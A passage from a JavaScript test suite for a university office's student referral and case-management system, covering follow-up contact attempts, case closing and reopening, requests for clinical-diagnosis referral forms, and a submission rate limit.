  ['F001_SUBMITTED', 'RISK_NOTE_SAVED', 'DOCUMENTS_UPDATED', 'F003_ISSUED', 'INTERVIEW_SCHEDULED', 'F002_SUBMITTED', 'DECISION_RECORDED', 'WAIVER_SIGNED', 'CASE_CLOSED', 'CASE_VIEWED']
    .forEach(a => assert.ok(log.some(l => l.action === a), a));
  assert.ok(log.filter(l => l.action === 'CASE_VIEWED').every(l => l.actor === STAFF));
});

console.log('Follow up');
function expire(ref) {
  const a = rows('ContactAttempts').filter(x => x.case_id === ref && !x.result)[0];
  S.ieoUpdate_('ContactAttempts', a._row, { due_date: '2020-01-01' });
}
test('three failed attempts (student, referrer, department head) close the referral', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Unreachable Student', s_program: 'Bachelor of Science in Psychology', s_department: 'whatever' }));
  assert.strictEqual(S.ieoFindCase_(r.ref).department, 'CAS', 'department taken from the program list');
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF);
  let v = S.getCase(r.ref).followUp;
  S.logContactAttempt(r.ref, { method: 'Email', to: v.draft.to, subject: v.draft.subject, body: v.draft.body });
  expire(r.ref);
  assert.strictEqual(S.recordContactResult(r.ref, 'No response', '').closed, false);
  v = S.getCase(r.ref).followUp;
  assert.strictEqual(v.next.target, 'referrer');
  assert.strictEqual(v.draft.to, 'mreyes@rtu.edu.ph');
  assert.ok(v.draft.body.includes('Unreachable Student'));
  S.logContactAttempt(r.ref, { method: 'Phone', to: '09171234567', note: 'no answer' });
  expire(r.ref);
  S.recordContactResult(r.ref, 'No response', '');
  v = S.getCase(r.ref).followUp;
  assert.strictEqual(v.next.target, 'dept_head');
  assert.strictEqual(v.next.name, 'Asst. Prof. Iris Cristelle D. Destura');
  assert.strictEqual(v.next.email, '', 'no head email yet');
  S.logContactAttempt(r.ref, { method: 'Email', to: 'psych.head@rtu.edu.ph', subject: v.draft.subject, body: v.draft.body });
  assert.strictEqual(S.ieoFindProgram_('Bachelor of Science in Psychology').head_email, 'psych.head@rtu.edu.ph', 'head email saved to Programs');
  expire(r.ref);
  const before = world.mail.length;
  const res = S.recordContactResult(r.ref, 'No response', '', true);
  assert.ok(res.closed && res.referrerNotified);
  assert.ok(/referral closed/.test(world.mail[before].subject) && world.mail[before].to === 'mreyes@rtu.edu.ph');
  const c = S.ieoFindCase_(r.ref);
  assert.strictEqual(c.stage, 'CLOSED');
  assert.strictEqual(c.followup_status, 'UNREACHABLE');
  assert.match(c.close_reason, /No response/);
  assert.throws(() => S.logContactAttempt(r.ref, { method: 'Phone' }), /before the interview/);
  // the student turns up later
  assert.throws(() => S.reopenCase(r.ref, ''), /why/);
  S.reopenCase(r.ref, 'Student came to the IEO');
  const c2 = S.ieoFindCase_(r.ref);
  assert.strictEqual(c2.stage, 'RECEIVED');
  assert.strictEqual(c2.followup_status, 'RESPONDED');
});
test('self referrals skip the referrer: two attempts, then closed', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Self Ref', r_source: 'Self', r_name: 'Self Ref', attest_name: 'Self Ref', s_program: 'Bachelor of Science in Biology' }));
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF);
  const v = S.getCase(r.ref).followUp;
  same(v.plan.map(p => p.target), ['student', 'dept_head']);
  S.logContactAttempt(r.ref, { method: 'Phone', to: '0917' });
  expire(r.ref);
  S.recordContactResult(r.ref, 'No response', '');
  assert.strictEqual(S.getCase(r.ref).followUp.next.target, 'dept_head');
  S.logContactAttempt(r.ref, { method: 'In person', to: 'CAS office' });
  expire(r.ref);
  assert.strictEqual(S.recordContactResult(r.ref, 'No response', '', true).referrerNotified, false, 'no referrer to notify');
  assert.strictEqual(S.ieoFindCase_(r.ref).stage, 'CLOSED');
});
test('the Programs tab is filled from the IEO list and the public list shows no head names', () => {
  const progs = rows('Programs');
  assert.strictEqual(progs.length, IEO.PROGRAM_SEED.length);
  const pub = JSON.parse(I.doGet({ parameter: { action: 'programs' } }).getContent());
  assert.strictEqual(pub.programs.length, IEO.PROGRAM_SEED.length);
  same(Object.keys(pub.programs[0]).sort(), ['college', 'program']);
  assert.ok(!JSON.stringify(pub).includes('Prof.') && !JSON.stringify(pub).includes('@'));
});
test('"Other" program on F001 uses the typed program', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Other Prog', s_program: 'Other', s_program_other: 'BS Nursing', s_department: 'CHS' }));
  const c = S.ieoFindCase_(r.ref);
  assert.strictEqual(c.program, 'BS Nursing');
  assert.strictEqual(c.department, 'CHS');
  assert.ok(post('submit_f001', Object.assign({}, F001, { s_program: 'Other' })).fields.s_program_other);
});

console.log('F004 Request for Referral Form for Clinical Diagnosis');
test('the public site can no longer record an F003', () => {
  assert.match(post('submit_f003', { case_id: caseId, to_profession: 'Physician', consent: true }).error, /Unknown form/);
});
let ndRef;
const F004 = { s_name: 'Santos, Ana', s_email: 'ana.santos@rtu.edu.ph', to_profession: 'Psychologist', to_name: 'Dr. Cruz', to_institution: 'City Clinic', notes: 'Free on Fridays', consent: true };
test('a matching F004 request attaches to the case and counts as the student responding', () => {
  ndRef = post('submit_f001', Object.assign({}, F001, { s_name: 'Santos, Ana', s_email: 'ana.santos@rtu.edu.ph' })).ref;
  S.saveRiskNote(ndRef, 'note'); S.assignCaseManager(ndRef, STAFF);
  S.logContactAttempt(ndRef, { method: 'Phone', to: '0917' });
  const before = world.mail.length;
  const r = post('submit_f004', Object.assign({ case_id: ndRef.toLowerCase() }, F004, { s_email: 'Ana.Santos@rtu.edu.ph' }));
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.match(r.ref, /^F004-/);
  same(Object.keys(r).sort(), ['ok', 'ref', 'submittedAt']);
  const req = rows('F004_Requests').pop();
  assert.ok(req.case_id === ndRef && req.case_found === 'Yes' && req.email_matches === 'Yes' && req.status === 'Pending');
  assert.strictEqual(S.ieoFindCase_(ndRef).followup_status, 'RESPONDED');
  assert.strictEqual(rows('ContactAttempts').filter(x => x.case_id === ndRef).pop().result, 'Responded');
  assert.ok(world.mail.slice(before).some(m => /Request for Referral Form/.test(m.subject) && !m.body.includes('Santos')), 'staff alerted without the name');
  assert.ok(S.listCases().find(c => c.case_id === ndRef).f004_pending);
});
test('staff issue the F003 from the request and the student is emailed to pick it up', () => {
  S.saveDocuments(ndRef, ['NEURODIVERGENT'], []);
  const v = S.getCase(ndRef);
  const reqId = v.f004[0].request_id;
  const before = world.mail.length;
  const rec = S.issueF003(ndRef, { request_id: reqId, to_profession: 'Psychologist', to_name: 'Dr. Cruz', issued_by: 'Case Manager', notify_pickup: true });
  assert.ok(rec.ok && rec.pickupEmailSent);
  const m = world.mail[before];
  assert.strictEqual(m.to, 'ana.santos@rtu.edu.ph');
  assert.ok(/ready/.test(m.subject) && /pick it up/.test(m.body) && m.body.startsWith('Dear Ana Santos,'));
  const req = S.getCase(ndRef).f004[0];
  assert.ok(req.status === 'Issued' && req.f003_id === rec.f003_id && req.handled_by === STAFF);
  assert.ok(!S.listCases().find(c => c.case_id === ndRef).f004_pending);
});
test('a request can be declined with a reason', () => {
  post('submit_f004', Object.assign({ case_id: ndRef }, F004));
  const req = S.getCase(ndRef).f004.find(r => r.status === 'Pending');
  assert.throws(() => S.declineF004(ndRef, req.request_id, ''), /reason/);
  S.declineF004(ndRef, req.request_id, 'Already has a diagnosis');
  assert.strictEqual(S.getCase(ndRef).f004.find(r => r.request_id === req.request_id).status, 'Declined');
  assert.throws(() => S.declineF004(ndRef, req.request_id, 'again'), /already declined/);
});
test('a request with an email that does not match is kept but flagged, and does not end the follow up', () => {
  const ref = post('submit_f001', Object.assign({}, F001, { s_name: 'Mismatch' })).ref;
  post('submit_f004', Object.assign({ case_id: ref }, F004, { s_email: 'someone.else@gmail.com' }));
  const req = rows('F004_Requests').pop();
  assert.strictEqual(req.email_matches, 'No');
  assert.notStrictEqual(S.ieoFindCase_(ref).followup_status, 'RESPONDED');
});
test('a request for an unknown reference gets the same reply and is counted for staff', () => {
  const r = post('submit_f004', Object.assign({ case_id: 'IEO-2026-9999' }, F004));
  same(Object.keys(r).sort(), ['ok', 'ref', 'submittedAt']);
  assert.strictEqual(rows('F004_Requests').pop().case_found, 'No');
  assert.ok(S.getConfig().unmatchedF004 >= 1);
});
test('F004 checks the reference format and needs consent', () => {
  const r = post('submit_f004', Object.assign({}, F004, { case_id: 'ABC', consent: false }));
  assert.ok(r.fields.case_id && r.fields.consent);
});

console.log('Flood guard');
test('submissions above the per minute limit are refused', () => {
  Object.keys(intake.cache).forEach(k => delete intake.cache[k]);
  keepRate = true;
  let last;
  for (let i = 0; i < IEO.MAX_SUBMISSIONS_PER_MINUTE + 1; i++) last = post('submit_f001', { consent: false });
  assert.match(last.error, /Many forms/);
  Object.keys(intake.cache).forEach(k => delete intake.cache[k]);
});

console.log('\n' + passed + ' passed, ' + failures.length + ' failed');
if (failures.length) process.exit(1);
